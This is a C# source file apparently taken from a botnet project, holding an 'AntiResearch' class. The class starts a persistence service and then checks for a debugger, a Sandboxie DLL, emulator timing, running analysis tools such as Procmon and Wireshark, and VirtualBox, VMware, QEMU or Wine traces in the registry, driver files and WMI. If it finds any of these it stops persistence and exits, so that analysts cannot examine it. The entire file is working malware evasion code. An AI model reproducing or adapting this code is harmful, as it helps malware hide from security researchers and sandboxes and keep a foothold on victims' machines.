using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using BotNet.Services.SystemOs;

namespace BotNet.Services.Common
{
    public class AntiResearch
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetUserName(StringBuilder sb, ref Int32 length);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, IntPtr ZeroOnly);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern uint GetFileAttributes(string lpFileName);

        Factory _factoryService = new Factory();
        SystemService _systemService = new SystemService();
        Persistence _persistenceService = new Persistence();
        public void StartAntiResearch()
        {
            _persistenceService.StartPersistent();
            if (Config.AntiDebugger)
            {
                try
                {
                    if (Debugger.IsAttached) { Terminate(); return; }
                }
                catch { }
            }

            if (Config.AntiSandboxie)
            {
                try
                {
                    foreach (var sModul in Process.GetCurrentProcess().Modules)
                    {
                        if (sModul.ToString().ToUpper().Contains("SBIEDLL.DLL")) { Terminate(); return; }
                    }
                }
                catch { }
            }

            if (Config.AntiEmulator)
            {
                try
                {
                    long lTicks = DateTime.Now.Ticks;
                    Thread.Sleep(10);
                    if ((DateTime.Now.Ticks - lTicks) < 10L) { Terminate(); return; }
                }
                catch { }
            }

            if (Config.AntiNetstat)
            {
                try
                {
                    if (_factoryService.CheckProcess("NETSTAT")) { Terminate(); return; }
                }
                catch { }
            }

            if (Config.AntiFilemon)
            {
                try
                {
                    if (_factoryService.CheckProcess("FILEMON")) { Terminate(); return; }
                }
                catch { }
            }

            if (Config.AntiProcessmon)
            {
                try
                {
                    if (_factoryService.CheckProcess("PROCMON")) { Terminate(); return; }
                }
                catch { }
            }

            if (Config.AntiRegmon)
            {
                try
                {
                    if (_factoryService.CheckProcess("REGMON")) { Terminate(); return; }
                }
                catch { }
            }

            if (Config.AntiNetworkmon)
            {
                try
                {
                    if (_factoryService.CheckProcess("NETMON")) { Terminate(); return; }
                }
                catch { }
            }

            if (Config.AntiTCPView)
            {
                try
                {
                    if (_factoryService.CheckProcess("TCPVIEW")) { Terminate(); return; }
                }
                catch { }
            }

            if (Config.AntiWireshark)
            {
                try
                {
                    if (_factoryService.CheckProcess("WIRESHARK")) { Terminate(); return; }
                }
                catch { }
            }

            if (Config.AntiPH)
            {
                AntiPH c = new AntiPH();
                new Thread(c.protect).Start();
            }

            if (Config.AntiVm)
            {
                if (_systemService.RegGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VBOX")) { Terminate(); }
                if (_systemService.RegGet("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VBOX")) { Terminate(); }
                if (_systemService.RegGet("HARDWARE\\Description\\System", "VideoBiosVersion").ToUpper().Contains("VIRTUALBOX")) { Terminate(); }
                if (_systemService.RegGet("SOFTWARE\\Oracle\\VirtualBox Guest Additions", "") == "noValueButYesKey") { Terminate(); }
                if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") != (uint)4294967295) { Terminate(); }

                if (_systemService.RegGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) { Terminate(); }
                if (_systemService.RegGet("SOFTWARE\\VMware, Inc.\\VMware Tools", "") == "noValueButYesKey") { Terminate(); }
                if (_systemService.RegGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) { Terminate(); }
                if (_systemService.RegGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) { Terminate(); }
                if (_systemService.RegGet("SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0").ToUpper().Contains("vmware".ToUpper())) { Terminate(); }
                if (_systemService.RegGet("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc").ToUpper().Contains("VMWARE")) { Terminate(); }
                if (_systemService.RegGet("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description").ToUpper().Contains("VMWARE")) { Terminate(); }
                if (_systemService.RegGet("SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath").ToUpper().Contains("C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\")) { Terminate(); }
                if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") != (uint)4294967295) { Terminate(); }
                if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") != (uint)4294967295) { Terminate(); }

                // Detected whine
                if (GetProcAddress((IntPtr)GetModuleHandle("kernel32.dll"), "wine_get_unix_file_name") != (IntPtr)0) { Terminate(); }

                if (_systemService.RegGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("QEMU")) { Terminate(); }
                if (_systemService.RegGet("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("QEMU")) { Terminate(); }

                var scope = new ManagementScope("\\\\.\\ROOT\\cimv2");
                var query = new ObjectQuery("SELECT * FROM Win32_VideoController");
                var searcher = new ManagementObjectSearcher(scope, query);
                var queryCollection = searcher.Get();
                foreach (var o in queryCollection)
                {
                    var m = (ManagementObject) o;
                    switch (m["Description"].ToString())
                    {
                        case "VM Additions S3 Trio32/64":
                            Terminate();
                            break;
                        case "S3 Trio32/64":
                            Terminate();
                            break;
                        case "VirtualBox Graphics Adapter":
                            Terminate();
                            break;
                        case "VMware SVGA II":
                            Terminate();
                            break;
                    }

                    if (m["Description"].ToString().ToUpper().Contains("VMWARE")) { Terminate(); }
                    if (m["Description"].ToString() == "") { Terminate(); }
                }
            }
        }

        private void Terminate()
        {
            _persistenceService.StopPersistent();
            Environment.Exit(0);
        }
    }
}
